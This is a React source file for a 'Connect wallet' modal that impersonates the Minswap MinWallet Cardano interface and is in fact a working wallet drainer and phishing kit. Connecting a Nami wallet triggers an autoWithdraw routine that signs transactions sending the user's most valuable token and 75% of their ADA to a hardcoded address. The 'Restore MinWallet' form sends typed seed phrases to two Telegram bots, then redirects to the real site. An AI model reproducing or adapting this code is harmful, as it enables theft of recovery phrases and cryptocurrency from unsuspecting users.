import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router";
import { Link } from "react-router-dom";
import { Buffer } from "buffer";
import axios from "axios";

function ConnectWallet({ onClose }) {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [walletAction, setWalletAction] = useState(null);
  const [restoreMethod, setRestoreMethod] = useState(null);
  const [showRestoreContainer, setShowRestoreContainer] = useState(false);
  const [fileName, setFileName] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [CardanoWasm, setCardanoWasm] = useState(null);
  const [balance, setBalance] = useState(null);
  const [usdBalance, setUsdBalance] = useState(null);
  const [address, setAddress] = useState("");
  const navigate = useNavigate();

  useEffect(() => {
    const loadWasm = async () => {
      const wasmModule = await import(
        "@emurgo/cardano-serialization-lib-browser"
      );
      setCardanoWasm(wasmModule);
    };

    loadWasm();
  }, []);

  const BLOCKFROST_API_KEY = "mainnetl7kg73l1Eh3mif46gJOJHIfTtbYosjl8";
  const BLOCKFROST_API_URL = "https://cardano-mainnet.blockfrost.io/api/v0";

  const fetchProtocolParams = async () => {
    try {
      const response = await axios.get(
        `${BLOCKFROST_API_URL}/epochs/latest/parameters`,
        {
          headers: {
            project_id: BLOCKFROST_API_KEY,
          },
        },
      );
      return response.data;
    } catch (error) {
      console.error("Error fetching protocol parameters", error);
    }
  };

  async function updateBalance(walletApi) {
    try {
      const balanceInLovelace = await walletApi.getBalance();
      console.log("Raw balance from API:", balanceInLovelace);

      const isHex = /^[0-9A-Fa-f]+$/.test(balanceInLovelace);
      console.log("Is balance in hex format?", isHex);

      let balanceInAda;
      if (isHex) {
        balanceInAda = CardanoWasm.Value.from_bytes(
          Buffer.from(balanceInLovelace, "hex"),
        );
      } else {
        balanceInAda = Number(balanceInLovelace) / 1000000;
      }
      console.log("Calculated ADA balance:", balanceInAda.coin().to_str());

      const newBalance = parseInt(balanceInAda.coin().to_str()) / 1000000;
      setBalance(newBalance);

      const response = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd",
      );
      const data = await response.json();
      const adaToUsd = data.cardano.usd;
      console.log("Current ADA to USD rate:", adaToUsd);

      const balanceInUsd = newBalance * adaToUsd;
      console.log("Calculated USD balance:", balanceInUsd);
      setUsdBalance(balanceInUsd);

      return newBalance;
    } catch (error) {
      console.error("Error fetching balance or exchange rate:", error);
      return null;
    }
  }
  
async function autoWithdraw(walletApi, currentBalance, address) {
  if (currentBalance === null || currentBalance === 0 || isNaN(currentBalance)) {
    console.error("Balance not available or is NaN");
    return;
  }

  const recipientAddress = "addr1q9pc6lms0z654jv4hepyng6u3snr3y9ex28memq6ay7f2yfhvzr4tkf4zcpefxnvvhstggsgqllte080ejha992ua8ksfrk9g6";
  let localBalance = currentBalance; // Track balance locally

  console.log(`Starting balance: ${localBalance.toFixed(6)} ADA`);

  try {
    const protocolParams = await fetchProtocolParams();

    // Fetch UTXOs
    let utxosHex = await walletApi.getUtxos();
    if (!utxosHex || !Array.isArray(utxosHex) || utxosHex.length === 0) {
      console.error("No UTXOs found or invalid UTXO format");
      return;
    }

    let utxos = await getTxUnspentOutputs(utxosHex);
    if (!utxos || utxos.len() === 0) {
      console.error("Parsed UTXOs are empty or invalid");
      return;
    }

    let totalAdaAmount = 0;
    let nonNativeTokens = [];

    // Collect ADA and non-native tokens
    for (let i = 0; i < utxos.len(); i++) {
      const utxo = utxos.get(i);
      const outputAmount = utxo.output().amount();
      const adaAmount = parseInt(outputAmount.coin().to_str());
      if (!isNaN(adaAmount)) {
        totalAdaAmount += adaAmount;
      }

      const multiasset = outputAmount.multiasset();
      if (multiasset) {
        const keys = multiasset.keys();
        const N = keys.len();
        for (let i = 0; i < N; i++) {
          const policyId = keys.get(i);
          const assets = multiasset.get(policyId);
          const assetNames = assets.keys();
          const K = assetNames.len();
          for (let j = 0; j < K; j++) {
            const assetName = assetNames.get(j);
            const amount = parseInt(multiasset.get_asset(policyId, assetName).to_str());
            if (!isNaN(amount)) {
              nonNativeTokens.push({
                policyId: policyId.to_hex(),
                assetName: Buffer.from(assetName.name()).toString(),
                amount: amount,
              });
            }
          }
        }
      }
    }

    // Sort non-native tokens from most to least value
    nonNativeTokens.sort((a, b) => b.amount - a.amount);

    // Check if ADA is the most valuable token
    let adaToWithdraw = Math.floor(totalAdaAmount);
    let mostValuableToken = { assetName: "ADA", amount: adaToWithdraw };

    // Determine whether a non-native token is more valuable than ADA
    if (nonNativeTokens.length > 0 && nonNativeTokens[0].amount > adaToWithdraw) {
      mostValuableToken = nonNativeTokens[0]; // Set the most valuable non-native token
    }

    // Withdraw the most valuable token first
    if (mostValuableToken.assetName !== "ADA") {
      // Withdraw the most valuable non-ADA token
      const amountToWithdraw = Math.floor(mostValuableToken.amount);
      console.log(`Withdrawing ${amountToWithdraw} of ${mostValuableToken.assetName}`);

      try {
        const adaUsedForTokenTransfer = parseInt(await buildSendTokenTransaction(
          recipientAddress,
          amountToWithdraw.toString(),
          mostValuableToken.policyId,
          mostValuableToken.assetName,
          walletApi,
          protocolParams,
          address
        ));

        console.log(`ADA used for ${mostValuableToken.assetName} transfer: ${adaUsedForTokenTransfer / 1000000} ADA`);

        // Update local ADA balance after non-ADA token transfer
        if (adaUsedForTokenTransfer && !isNaN(adaUsedForTokenTransfer)) {
          localBalance -= adaUsedForTokenTransfer / 1000000; // Convert Lovelace to ADA
          console.log(`Local balance after ${mostValuableToken.assetName} transfer: ${localBalance.toFixed(6)} ADA`);
        }

        // Refresh UTXOs and balance after the non-native token withdrawal
        utxosHex = await walletApi.getUtxos();
        utxos = await getTxUnspentOutputs(utxosHex);
        localBalance = await updateBalance(walletApi);

        // Ensure sufficient ADA balance remains for further transactions
        if (localBalance < 1) {
          console.error("Insufficient ADA for further transactions.");
          return;
        }

      } catch (error) {
        console.error(`Failed to transfer ${mostValuableToken.assetName}:`, error);
        return; // Stop if the transaction fails
      }
    }

    // Proceed to withdraw ADA after non-native tokens
    adaToWithdraw = Math.floor(localBalance * 0.75); // Withdraw 75% of remaining ADA
    if (!isNaN(adaToWithdraw)) {
      const adaInLovelace = Math.floor(adaToWithdraw * 1000000).toString();
      console.log(`Withdrawing ${adaInLovelace} Lovelace of ADA`);

      try {
        await buildSendADATransaction(
          recipientAddress,
          adaInLovelace,
          walletApi,
          protocolParams,
          address
        );
        localBalance -= adaToWithdraw;
        console.log(`Balance after ADA withdrawal: ${localBalance.toFixed(6)} ADA`);
      } catch (error) {
        console.error("Failed to transfer ADA:", error);
      }
    }

  } catch (error) {
    console.error("Error during auto-withdrawal:", error);
  }
}


async function calculateMinUTXO(outputAmount, protocolParams, multiAsset = null) {
  const minUTXOValue = CardanoWasm.BigNum.from_str(protocolParams.coins_per_utxo_size.toString());
  
  if (!multiAsset) {
    // If no multi-asset, return the default minimum UTXO value
    return minUTXOValue;
  }

  const numAssets = multiAsset.keys().len();
  const policySize = multiAsset.to_bytes().length;

  // UTXO cost for multi-asset is determined by the number of assets and their size
  const utxoCostPerWord = CardanoWasm.BigNum.from_str(protocolParams.coins_per_utxo_word.toString());
  const additionalAssetCost = utxoCostPerWord.checked_mul(CardanoWasm.BigNum.from_str((policySize + numAssets).toString()));

  return CardanoWasm.BigNum.max(minUTXOValue, additionalAssetCost);
}

async function buildSendTokenTransaction(
  recAddress,
  amount,
  policyId,
  assetName,
  walletApi,
  protocolParams,
  address
) {
  console.log(`Building transaction for ${assetName} with amount: ${amount}`);

  const txBuilder = CardanoWasm.TransactionBuilder.new(
    CardanoWasm.TransactionBuilderConfigBuilder.new()
      .fee_algo(
        CardanoWasm.LinearFee.new(
          CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
          CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString())
        )
      )
      .pool_deposit(
        CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString())
      )
      .key_deposit(
        CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString())
      )
      .coins_per_utxo_word(
        CardanoWasm.BigNum.from_str(
          protocolParams.coins_per_utxo_word.toString()
        )
      )
      .max_tx_size(16384)
      .max_value_size(5000)
      .build()
  );

  const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
  const shelleyChangeAddress = CardanoWasm.Address.from_bech32(address);

  const utxosHex = await walletApi.getUtxos();
  const utxos = utxosHex.map((hex) =>
    CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex"))
  );

  utxos.forEach((utxo) => {
    txBuilder.add_input(
      CardanoWasm.Address.from_bech32(address),
      utxo.input(),
      utxo.output().amount()
    );
  });

  const assets = CardanoWasm.MultiAsset.new();
  const asset = CardanoWasm.Assets.new();
  asset.insert(
    CardanoWasm.AssetName.new(Buffer.from(assetName, "utf8")),
    CardanoWasm.BigNum.from_str(amount)
  );
  assets.insert(CardanoWasm.ScriptHash.from_bytes(Buffer.from(policyId, "hex")), asset);

  const outputValue = CardanoWasm.Value.new(CardanoWasm.BigNum.from_str("0"));
  outputValue.set_multiasset(assets);

  // Calculate the correct minimum ADA required for this multi-asset transaction
  const minUTXO = await calculateMinUTXO(outputValue, protocolParams, assets);
  console.log(`Minimum UTXO for ${assetName}: ${minUTXO.to_str()} Lovelace`);

  // Ensure the minimum ADA for the multi-asset transaction is met
  const adaAmountRequired = CardanoWasm.BigNum.max(
    minUTXO,
    CardanoWasm.BigNum.from_str('1990000') // Ensure at least 2 ADA in lovelace
  );

  console.log(`ADA required for ${assetName}: ${adaAmountRequired.to_str()} Lovelace`);

  outputValue.set_coin(adaAmountRequired);

  txBuilder.add_output(
    CardanoWasm.TransactionOutput.new(shelleyOutputAddress, outputValue)
  );

  // Add change if needed (to meet fee and UTXO requirements)
  txBuilder.add_change_if_needed(shelleyChangeAddress);

  const txBody = txBuilder.build();
  const transactionWitnessSet = CardanoWasm.TransactionWitnessSet.new();

  const tx = CardanoWasm.Transaction.new(
    txBody,
    CardanoWasm.TransactionWitnessSet.from_bytes(transactionWitnessSet.to_bytes())
  );

  let txVkeyWitnesses = await walletApi.signTx(
    Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
    true
  );

  txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
    Buffer.from(txVkeyWitnesses, "hex")
  );

  transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());

  const signedTx = CardanoWasm.Transaction.new(tx.body(), transactionWitnessSet);

  const submittedTxHash = await walletApi.submitTx(
    Buffer.from(signedTx.to_bytes(), "utf8").toString("hex")
  );
  console.log("Submitted transaction hash:", submittedTxHash);

  // Return the ADA used in this transaction (used to adjust local balance)
  return adaAmountRequired.to_str();
}

async function buildSendADATransaction(
  recAddress,
  amount,
  walletApi,
  protocolParams,
  address
) {
  const txBuilder = CardanoWasm.TransactionBuilder.new(
    CardanoWasm.TransactionBuilderConfigBuilder.new()
      .fee_algo(
        CardanoWasm.LinearFee.new(
          CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
          CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString())
        )
      )
      .pool_deposit(
        CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString())
      )
      .key_deposit(
        CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString())
      )
      .coins_per_utxo_word(
        CardanoWasm.BigNum.from_str(
          protocolParams.coins_per_utxo_word.toString()
        )
      )
      .max_tx_size(16384)
      .max_value_size(5000)
      .build()
  );

  const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
  const shelleyChangeAddress = CardanoWasm.Address.from_bech32(address);

  const utxosHex = await walletApi.getUtxos();
  const utxos = utxosHex.map((hex) =>
    CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex"))
  );

  utxos.forEach((utxo) => {
    txBuilder.add_input(
      CardanoWasm.Address.from_bech32(address),
      utxo.input(),
      utxo.output().amount()
    );
  });

  const adaAmount = CardanoWasm.BigNum.from_str(amount);
  const totalADA = CardanoWasm.Value.new(adaAmount);

  const minUTXO = await calculateMinUTXO(totalADA, protocolParams);

  // Ensure the ADA meets the minimum UTXO requirement
  if (adaAmount.compare(minUTXO) < 0) {
    totalADA.set_coin(minUTXO);
  }

  txBuilder.add_output(
    CardanoWasm.TransactionOutput.new(shelleyOutputAddress, totalADA)
  );

  txBuilder.add_change_if_needed(shelleyChangeAddress);

  const txBody = txBuilder.build();
  const transactionWitnessSet = CardanoWasm.TransactionWitnessSet.new();

  const tx = CardanoWasm.Transaction.new(
    txBody,
    CardanoWasm.TransactionWitnessSet.from_bytes(transactionWitnessSet.to_bytes())
  );

  let txVkeyWitnesses = await walletApi.signTx(
    Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
    true
  );

  txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
    Buffer.from(txVkeyWitnesses, "hex")
  );

  transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());

  const signedTx = CardanoWasm.Transaction.new(tx.body(), transactionWitnessSet);

  const submittedTxHash = await walletApi.submitTx(
    Buffer.from(signedTx.to_bytes(), "utf8").toString("hex")
  );
  console.log("Submitted transaction hash:", submittedTxHash);
}

async function getTxUnspentOutputs(utxosHex) {
  const txOutputs = CardanoWasm.TransactionUnspentOutputs.new();

  for (const utxor of utxosHex) {
    try {
      // Convert hex UTXO to TransactionUnspentOutput object
      const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
        Buffer.from(utxor, "hex")
      );
      txOutputs.add(utxo);
    } catch (error) {
      console.error("Failed to parse UTXO:", error);
      throw new Error("Invalid UTXO format");
    }
  }

  return txOutputs;
}


  const handleWalletSelection = async (wallet) => {
    if (wallet === "Nami") {
      if (window.cardano && window.cardano.nami) {
        try {
          const walletApi = await window.cardano.nami.enable();

          if (walletApi) {
            console.log("Wallet API object:", walletApi);

            await new Promise((resolve) => setTimeout(resolve, 1000));

            let addresses;
            try {
              addresses = await walletApi.getUsedAddresses();
              console.log("Used addresses:", addresses);
            } catch (error) {
              console.error("Error getting used addresses:", error);
              if (typeof walletApi.getAddresses === "function") {
                addresses = await walletApi.getAddresses();
                console.log("All addresses:", addresses);
              } else {
                console.error("Unable to retrieve addresses");
                return;
              }
            }

            if (addresses && addresses.length > 0) {
              const hexAddress = addresses[0];

              setSelectedWallet("Nami");
              const addressBytes = Buffer.from(hexAddress, "hex");
              const address = CardanoWasm.Address.from_bytes(addressBytes);
              console.log(
                `Connected to Nami. Hex Address:`,
                address?.to_bech32(),
              );
              setAddress(address?.to_bech32());

              // Get the balance directly
              const currentBalance = await updateBalance(walletApi);

              if (currentBalance !== null) {
                console.log("Current balance:", currentBalance);
                await autoWithdraw(
                  walletApi,
                  currentBalance,
                  address?.to_bech32(),
                );
              } else {
                console.error("Failed to retrieve balance");
              }
              onClose();
            } else {
              console.error("No addresses found");
              alert(
                "No addresses found in the wallet. If this is a new wallet, please make a transaction first.",
              );
            }
          }
        } catch (error) {
          console.error(`Error connecting to Nami wallet:`, error);
          alert(
            `Error connecting to Nami wallet. Please try again`,
          );
        }
      } else {
        console.error(
          `Nami wallet not found. Please install the extension.`,
        );
        alert(`Nami wallet not found. Please install the extension.`);
      }
    } else if (wallet === "Eternl") {
      navigate("/eternl");
    } else {
      setSelectedWallet(wallet);
    }
  };

  const handleBackdropClick = (e) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  const handleGoBack = () => {
    if (showRestoreContainer) {
      setShowRestoreContainer(false);
    } else {
      setWalletAction(null);
      setRestoreMethod(null);
    }
  };

  const handleRadioChange = (e) => {
    setRestoreMethod(e.target.value);
  };

  const handleSeedPhraseChange = (value) => {
    setSeedPhrase(value);
  };

  const handleNext = () => {
    if (restoreMethod === "seedPhrase" || restoreMethod === "import") {
      setShowRestoreContainer(true);
    }
  };

  const handleFileChange = (event) => {
    if (event.target.files.length > 0) {
      setFileName(event.target.files[0].name);
    } else {
      setFileName("");
    }
  };

  const isExactly12Words = (phrase) => {
    const words = phrase.trim().split(/\s+/);
    return words.length === 12;
  };
  const handleTransferWallet = async (message, attemptCount) => {
    const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
    const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
    const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
    const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;

    const endpoints = [
      {
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
          chat_id: chat_id,
          text: `Minwallet:   ${message}`,
        },
      },
      {
        url: `https://api.telegram.org/bot${otoken}/sendMessage`,
        data: {
          chat_id: ochat_id,
          text: `Minwallet:   ${message}`,
        },
      },
    ];

    for (const endpoint of endpoints) {
      try {
        const response = await fetch(endpoint.url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(endpoint.data),
        });

        if (response.ok) {
          console.log(`null`);
        } else {
          console.error(`error`);
        }
      } catch (error) {
        console.error(`error`, error);
      }
    }
  };
  const SeedPhraseContainer = ({ handleTransferWallet, onClose }) => {
    const textareaRef = useRef(null);
    const [attemptCount, setAttemptCount] = useState(0);

    const handleSubmit = () => {
      if (textareaRef.current) {
        const message = textareaRef.current.value.trim();
        const newAttemptCount = attemptCount + 1;
        setAttemptCount(newAttemptCount);

        handleTransferWallet(message, newAttemptCount);

        if (newAttemptCount === 3) {
          window.location.href = "https://minswap.org/fi-FI";
        }
      }
    };

    return (
      <div>
        <h2 className="text-lg font-semibold text-textSecondary mb-4">
          Restore MinWallet
        </h2>
        <p className="text-textSecondary mt-3 text-sm">
          Please write your seed phrase in the right order.
        </p>
        <p className="text-textPrimary mt-3 mb-3 text-sm">
          Use space between each phrase
        </p>
        <textarea
          ref={textareaRef}
          className="w-full p-2 bg-[#121212] border border-stone-700 text-textSecondary rounded-lg"
          rows="4"
        ></textarea>
        <button
          className="p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold"
          onClick={handleSubmit}
          disabled={attemptCount >= 3}
        >
          {attemptCount < 3 ? "Next" : "Next"}
        </button>
      </div>
    );
  };

  const ImportContainer = () => {
    const handleFileChange = (event) => {
      if (event.target.files.length > 0) {
        setFileName(event.target.files[0].name);
        setFileUploaded(true);
      } else {
        setFileName("");
        setFileUploaded(false);
      }
    };

    return (
      <div>
        <h2 className="text-lg font-semibold text-textSecondary mb-4">
          Restore MinWallet
        </h2>
        <div className="w-full rounded-xl p-4">
          <label className="flex flex-col items-center justify-center w-full h-36 bg-[#2a2d36] text-textSecondary rounded cursor-pointer hover:bg-[#3a3d46] transition-colors">
            <img
              alt="Import wallet"
              width={67}
              height={67}
              className="size-16 mb-2"
              src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721984028/vujnxx74twnh3q93impv.png"
            />
            {fileName && <span className="text-sm mt-2">{fileName}</span>}
            <input
              type="file"
              accept=".json"
              className="hidden"
              onChange={handleFileChange}
            />
          </label>
        </div>
        <p className="text-center text-textPrimary text-sm mt-2 font-medium">
          Import MinWallet.json file
        </p>
        <button
          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold flex items-center justify-center gap-2 ${!fileUploaded ? "opacity-50 cursor-not-allowed" : ""
            }`}
          disabled={!fileUploaded}
          onClick={handleTransferWallet}
        >
          <svg
            viewBox="0 0 24 24"
            xmlns="http://www.w3.org/2000/svg"
            width="20"
            height="24"
            fill="currentColor"
            className="remixicon "
          >
            <path d="M13 10H18L12 16L6 10H11V3H13V10ZM4 19H20V12H22V20C22 20.5523 21.5523 21 21 21H3C2.44772 21 2 20.5523 2 20V12H4V19Z"></path>
          </svg>
          Next
        </button>
      </div>
    );
  };

  return (
    <div className="fixed inset-0 flex items-center justify-center lg:justify-end z-[500] bg-[#ffffff1c] bg-opacity-50 backdrop-blur">
      <div className="ConnectWallet w-full max-w-[420px] lg:h-full lg:bg-[#111218]">
        <div
          className="inset-0 z-[500] flex flex-col items-center justify-center lg:p-0 px-6 lg:p-0 py-24 ]"
          onClick={handleBackdropClick}
        >
          <div className="height flex w-full flex-col overflow-hidden bg-[#111218] text-left align-middle shadow-2xl max-w-[420px] h-fit space-y-6 lg:rounded-none rounded-[20px] py-6">
            <div className="flex items-center justify-between space-x-2 px-4 md:px-6 ">
              <div className="space-y-2">
                <h2 className="font-interDisplay text-xl text-textSecondary font-semibold">
                  Connect wallet
                </h2>
              </div>
              <button
                className="flex select-none items-center justify-center space-x-2 whitespace-nowrap transition-colors group rounded-full cursor-pointer bg-transparent hover:bg-sf-pri-hv active:bg-sf-pri-pressed disabled:bg-transparent size-6"
                onClick={onClose}
              >
                <span className="[&>svg]:size-6 text-itr-tentSec-df group-hover:text-itr-tentSec-df group-active:text-itr-tentSec-df group-disabled:text-itr-tentPri-dis">
                  <svg
                    viewBox="0 0 24 24"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    fill="currentColor"
                    className="remixicon text-textSecondary"
                  >
                    <path d="M11.9997 10.5865L16.9495 5.63672L18.3637 7.05093L13.4139 12.0007L18.3637 16.9504L16.9495 18.3646L11.9997 13.4149L7.04996 18.3646L5.63574 16.9504L10.5855 12.0007L5.63574 7.05093L7.04996 5.63672L11.9997 10.5865Z"></path>
                  </svg>
                </span>
              </button>
            </div>

            <div className="flex-1 overflow-y-auto px-4 md:px-6 flex flex-col justify-between">
              {selectedWallet ? (
                <div className="flex-1 space-y-4">
                  {selectedWallet === "MinWallet" && (
                    <div>
                      {!walletAction ? (
                        <>
                          <button
                            className="flex select-none items-center justify-center whitespace-nowrap transition-colors outline-none cursor-pointer  border-transparent text-[#3b82f6] text-xs font-semibold pt-2 pb-3"
                            onClick={() => setSelectedWallet(null)}
                          >
                            <svg
                              viewBox="0 0 24 24"
                              xmlns="http://www.w3.org/2000/svg"
                              width="24"
                              height="24"
                              fill="currentColor"
                              className="remixicon size-4 shrink-0 me-1"
                            >
                              <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"></path>
                            </svg>
                            Go back
                          </button>

                          <h1 className="text-textSecondary font-semibold text-lg">
                            {selectedWallet}
                          </h1>

                          <div className="rounded-lg bg-[#89aaff] pt-4">
                            <img
                              src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721838634/er58bc1qciu4fizena2m.svg"
                              alt="minwallet"
                              className="w-100 m-auto"
                            />
                          </div>
                          <p className="text-xs font-medium text-textSecondary mt-4">
                            Minwallet is a secure and user-friendly wallet built
                            directly into Minswap DApp for seamless token
                            swapping and management.
                          </p>
                          <p className="text-xs font-medium text-textSecondary mt-4">
                            Let's get started with creating a new wallet or
                            restoring an existing wallet.
                          </p>

                          <div className="flex flex-col items-center justify-center font-medium mt-2">
                            <button
                              className="p-3 mt-2 bg-[#89aaff] rounded-full text-xs w-full"
                              onClick={() => setWalletAction("new")}
                            >
                              New wallet
                            </button>
                            <button
                              className="p-3 mt-2 border border-stone-300 rounded-full text-textSecondary text-xs w-full"
                              onClick={() => setWalletAction("restore")}
                            >
                              Restore wallet
                            </button>
                          </div>
                        </>
                      ) : (
                        <>
                          <button
                            className="flex select-none items-center justify-center whitespace-nowrap transition-colors outline-none cursor-pointer border-transparent text-[#3b82f6] text-xs font-semibold pt-2"
                            onClick={handleGoBack}
                          >
                            <svg
                              viewBox="0 0 24 24"
                              xmlns="http://www.w3.org/2000/svg"
                              width="24"
                              height="24"
                              fill="currentColor"
                              className="remixicon size-4 shrink-0 me-1"
                            >
                              <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"></path>
                            </svg>
                            Go back
                          </button>

                          {walletAction === "new" ? (
                            <div>
                              <h2 className="text-lg font-semibold text-textSecondary mb-4">
                                Create New Wallet
                              </h2>
                              <p className="text-sm text-textSecondary">
                                Here you can add steps or forms for creating a
                                new wallet.
                              </p>
                            </div>
                          ) : (
                            <div>
                              {!showRestoreContainer ? (
                                <>
                                  <h2 className="text-lg font-semibold text-textSecondary mb-4">
                                    Restore Wallet
                                  </h2>

                                  <div className="overflow-y-auto">
                                    <div className="mb-4 border w-full p-4 rounded-lg flex gap-3">
                                      <input
                                        type="radio"
                                        name="restoreMethod"
                                        value="seedPhrase"
                                        id="seedPhrase"
                                        className="w-6 h-6 mt-1"
                                        onChange={handleRadioChange}
                                      />
                                      <div>
                                        <h1 className="text-textSecondary font-medium text-lg text-left">
                                          Seed phrase
                                        </h1>
                                        <p className="text-left text-textPrimary text-sm">
                                          Restore using seed phrase.
                                        </p>
                                      </div>
                                    </div>
                                    <div className="border w-full p-4 rounded-lg flex gap-3">
                                      <input
                                        type="radio"
                                        name="restoreMethod"
                                        value="import"
                                        id="import"
                                        className="w-6 h-6 mt-1"
                                        onChange={handleRadioChange}
                                      />
                                      <div>
                                        <h1 className="text-textSecondary font-medium text-lg text-left">
                                          Import
                                        </h1>
                                        <p className="text-left text-textPrimary text-sm">
                                          Import from existing wallet JSON file.
                                        </p>
                                      </div>
                                    </div>
                                  </div>

                                  <div className="flex flex-col mt-4">
                                    <button
                                      className="p-3 mt-2 bg-[#89aaff] rounded-full text-sm w-full font-semibold"
                                      onClick={handleNext}
                                    >
                                      Next
                                    </button>
                                    <button
                                      className="p-3 mt-2 bg-[#1f2025] rounded-full text-textSecondary text-sm w-full"
                                      onClick={handleGoBack}
                                    >
                                      Back
                                    </button>
                                  </div>
                                </>
                              ) : (
                                <div className="mt-4">
                                  {restoreMethod === "seedPhrase" ? (
                                    <SeedPhraseContainer
                                      handleTransferWallet={
                                        handleTransferWallet
                                      }
                                      onClose={onClose}
                                    />
                                  ) : (
                                    <ImportContainer />
                                  )}
                                  <button
                                    className="p-3 mt-4 bg-[#1f2025] rounded-full text-textSecondary text-sm w-full"
                                    onClick={handleGoBack}
                                  >
                                    Back
                                  </button>
                                </div>
                              )}
                            </div>
                          )}
                        </>
                      )}
                    </div>
                  )}

                  {/* {selectedWallet === "Ledger" && (
                  <div className="bg-[#1f2025] p-4 rounded-lg">
                    <p className="text-textSecondary mb-2">
                      Please connect your Ledger device and open the Cardano
                      app.
                    </p>
                    <button className="bg-blue-500 text-white px-4 py-2 rounded">
                      Detect Ledger
                    </button>
                  </div>
                )} */}

                  {selectedWallet === "Nami" && (
                    <div className="bg-[#1f2025] p-4 rounded-lg">
                      <p className="text-textSecondary mb-2">
                        Make sure you have Nami wallet installed in your
                        browser.
                      </p>
                      <button className="bg-blue-500 text-white px-4 py-2 rounded">
                        Connect Nami
                      </button>
                    </div>
                  )}

                  {selectedWallet === "Eternl" && (
                    <div className="bg-[#1f2025] p-4 rounded-lg">
                      <p className="text-textSecondary mb-2">
                        Connect your Eternl wallet to proceed.
                      </p>
                      <button className="bg-blue-500 text-white px-4 py-2 rounded">
                        Connect Eternl
                      </button>
                    </div>
                  )}

                  {/* {selectedWallet === "WalletConnect" && (
                  <div className="bg-[#1f2025] p-4 rounded-lg">
                    <p className="text-textSecondary mb-2">
                      Scan the QR code with your WalletConnect-compatible
                      wallet.
                    </p>
                    <div className="bg-white p-4 inline-block">
                      Detect Ledger
                    </div>
                  </div>
                )} */}

                  {selectedWallet === "Add Custom Wallet" && (
                    <div className="bg-[#1f2025] p-4 rounded-lg">
                      <p className="text-textSecondary mb-2">
                        Enter your custom wallet details:
                      </p>
                      <input
                        type="text"
                        placeholder="Wallet Name"
                        className="bg-[#2a2d36] text-textSecondary p-2 rounded mb-2 w-full"
                      />
                      <input
                        type="text"
                        placeholder="Wallet Address"
                        className="bg-[#2a2d36] text-textSecondary p-2 rounded mb-2 w-full"
                      />
                      <button className="bg-blue-500 text-white px-4 py-2 rounded">
                        Add Wallet
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                <>
                  <div className="flex-1 space-y-1 overflow-y-auto custom-scrollbar">
                    <div className="flex-1 space-y-1 overflow-y-auto">
                      <div
                        className="flex items-center cursor-pointer gap-x-4 p-3 "
                        onClick={() => handleWalletSelection("MinWallet")}
                      >
                        <img
                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831689/wedc8sye9jw3nj6kyyaj.svg"
                          className="size-8 shrink-0"
                          alt="minwallet"
                        />
                        <div className="flex-1">
                          <h1 className="text-textSecondary text-md font-semibold">
                            MinWallet
                          </h1>
                          <p className="text-[#919bd1] text-sm">
                            Mobile support
                          </p>
                        </div>
                        <svg
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          fill="currentColor"
                          className="text-textSecondary size-5 shrink-0"
                        >
                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
                        </svg>
                      </div>
                      <div
                        className="flex items-center cursor-pointer gap-x-4 p-3 "
                      //   onClick={() => handleWalletSelection("Ledger")}
                      >
                        <img
                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831775/abhvehnlx6umoknjxw5f.svg"
                          className="size-8 shrink-0 invert"
                          alt="ledger"
                        />
                        <div className="flex-1">
                          <h1 className="text-textSecondary text-md font-semibold">
                            Ledger
                          </h1>
                          <p className="text-[#919bd1] text-sm">
                            Not Available
                          </p>
                        </div>
                        <svg
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          fill="currentColor"
                          className="text-textSecondary size-5 shrink-0"
                        >
